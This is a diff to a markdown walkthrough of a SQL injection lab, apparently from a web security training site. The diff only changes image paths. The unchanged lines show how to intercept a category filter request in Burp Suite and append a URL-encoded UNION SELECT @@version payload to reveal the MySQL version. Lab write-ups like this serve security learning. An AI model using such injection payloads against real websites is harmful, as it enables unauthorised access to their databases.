@@ -17,14 +17,14 @@ step 1
 select any category then go to
 burpsuite => proxy => http history => click on =>`/filter?category=pets` => send to repeater
 
-![screnshot](images/lab8_category_pets.jpg)
+![screnshot](lab8_category_pets.jpg)
 
 step 2
 
 `' UNION SELECT @@version,NULL#` => URL Encoded (`'+UNION+SELECT+%40%40version,NULL%23`)
 `/filter?category=Pets'+UNION+SELECT+%40%40version,NULL%23`
 
-![screnshot](images/lab8_mysql_version_ubuntu_version.jpg)
+![screnshot](lab8_mysql_version_ubuntu_version.jpg)
 
 
 step 3
@@ -32,4 +32,4 @@ step 3
 To solve the lab
 add `'+UNION+SELECT+%40%40version,NULL%23` at the end of URL
 
-![screnshot](images/lab8_solved_lab.jpg)
+![screnshot](lab8_solved_lab.jpg)
